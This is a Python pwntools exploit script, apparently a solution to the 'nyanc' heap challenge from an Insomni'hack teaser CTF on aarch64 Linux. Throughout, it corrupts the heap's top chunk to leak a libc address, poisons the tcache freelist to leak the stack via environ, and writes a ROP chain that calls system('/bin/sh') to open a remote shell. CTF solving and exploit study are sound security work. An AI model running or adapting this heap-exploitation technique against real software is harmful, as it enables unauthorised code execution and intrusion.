#!/usr/bin/env python
import sys
import os
from pwn import *


### SETUP ###

LOCAL=True
context.update(arch="aarch64", os="linux")
context.log_level = 'info'
#context.log_level = 'debug'

def m():
    for _ in xrange(6):
        p.recvuntil("\n")
    p.recvuntil("> ")

def add(l,d):
    p.sendline("1")
    p.recvuntil("len : ")
    p.sendline("{}".format(l))
    p.recvuntil("data : ")
    if l > 0:
        p.send(d)
    log.info(p.recvuntil("\n"))
    return

def view(idx):
    p.sendline("2")
    p.recvuntil("index : ")
    p.sendline("{}".format(idx))
    r = p.recvuntil("====")
    #log.info(r)
    return r

def edit(idx,d):
    p.sendline("3")
    p.recvuntil("index : ")
    p.sendline("{}".format(idx))
    p.recvuntil("data : ")
    p.send(d)
    return

def delete(idx):
    p.sendline("4")
    p.recvuntil("index : ")
    p.sendline("{}".format(idx))
    return

### SPLOIT ###
def sploit():
    # Step 1: Leak Libc pointer
    # create overflowing chunk
    m()
    add(0, "A") # 0
    # shrink top-chunk
    m()
    edit(0, "A" *24 + p64(0xd91) + "\0" * 0x20)
    # trigger sys-malloc -> free current top 
    m()
    add(0x1000, "B" * (0x1000-1)) # 1
    # get chunk with fd & bk set to libc-addrs
    m()
    add(0, "C") # 2
    # use up remaining old top_chunk
    m()
    add(0xd40, "D") # 3
    # leak libc-addr
    leak = view(2).split("data: ")[1].split("==")[0].ljust(8, '\0')
    libc.address = u64(leak) - 0x1540d0
    log.info("libc-base @ " + hex(libc.address))
    
    # cleanup
    m()
    delete(0)
    m()
    delete(1)
    m()
    delete(2)
    m()
    delete(3)
   
    # Step 2: Prepare write pointer (we need to do this before we can leak)
    # get top_chunk close to next page-alignment
    m()
    add(0xf00, "A") # 0
    # get overflowing chunk
    m()
    add(0, "B") # 1
    # shrink top_chunk to be in tcache range
    m()
    edit(1, "C" *24 + p64(0xc1) + "\0" * 0x40) # <- We use this one to forge the tcache-fd pointer for the write
    # trigger sysmalloc -> free top_chunk
    m()
    add(0x400, "D" * (0x400-1)) # 2
   
    # Step 3: Leak Stack pointer
    # get top_chunk close to next page-alignment
    m()
    add(0xb80, "A") # 3
    # get overflowing chunk
    m()
    add(0, "B") # 4
    # shrink top_chunk to be in tcache range
    m()
    edit(4, "C" *24 + p64(0x41) + "\0" * 0x40)
    # trigger sysmalloc -> free top_chunk
    m()
    add(0x400, "D" * (0x400-1)) # 5
    
    # overwrite tcache->next
    m()
    edit(4, "C" *24 + p64(0x21) + p64(libc.symbols["environ"]) + "\0" * 0x20)

    m()
    add(0x8, "E") # 6
 
    m()
    add(0, "F")  # 7
   
    # leak environ
    leak = view(7).split("data: ")[1].split("==")[0].ljust(8, '\0')
    environ = u64(leak)
    log.info("environ @ " + hex(environ))
    
    #STACK = environ - 0x188 
    #STACK = environ - 0x188 - 0x30
    STACK = environ - 0x178 
   
    # cleanup
    m()
    delete(0)
    m()
    delete(2)
    m()
    delete(3)
    m()
    delete(4)
    m()
    delete(5)
    m()
    delete(6)
    m()
    delete(7)
   
    # overwrite tcache->next
    m()
    edit(1, "C" *24 + p64(0xa1) + p64(STACK) + "\0" * 0x20)

    m()
    add(0x98, "E") # 0
    
    # overwrite stack
    
    ROP_CHAIN = STACK-0x100
    call_pivot_gadget = libc.address + 0x62554 # 0x0000000000062554 : ldr x0, [x29, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
    
    payload = ""
    payload += p64(STACK+0x8)
    payload += p64(call_pivot_gadget)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(next(libc.search("/bin/sh\0"))) # /bin/sh
    payload += p64(libc.symbols['system']) # offset 8 because arm convention


    m()
    add(0x98, payload) # 2

    

    p.interactive()
    return

if __name__=="__main__":

    elf = ELF("./nyanc")
    libc = ELF("./libc.so.6")
    if LOCAL:

        HOST = "127.0.0.1"
        PORT = 4242
        p = remote(HOST, PORT)
    else:
        HOST = "nyanc.teaser.insomnihack.ch"
        PORT = 1337
        p = remote(HOST, PORT)

    sploit()

